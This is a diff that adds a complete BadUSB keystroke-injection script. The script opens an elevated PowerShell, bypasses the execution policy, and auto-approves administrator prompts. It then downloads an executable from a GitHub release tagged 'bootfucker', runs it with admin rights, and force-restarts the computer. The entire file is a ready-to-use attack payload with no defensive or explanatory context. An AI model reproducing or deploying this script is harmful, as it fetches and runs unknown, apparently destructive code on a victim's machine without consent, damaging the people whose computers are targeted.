@@ -1,0 +1,26 @@
+REM Script Created By Social :3
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Start-Process powershell -Verb RunAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/Socialfrrr/Socials-database/releases/download/bootfucker/Bai.Bai.exe" -OutFile "$env:USERPROFILE\Downloads\Bai.Bai.exe"
+ENTER
+DELAY 1300
+STRING Start-Process "$env:USERPROFILE\Downloads\Bai.Bai.exe" -Verb RunAs
+ENTER
+DELAY 500
+ALT y
+DELAY 1000
+STRING Restart-Computer -Force
+ENTER
+DELAY 1000
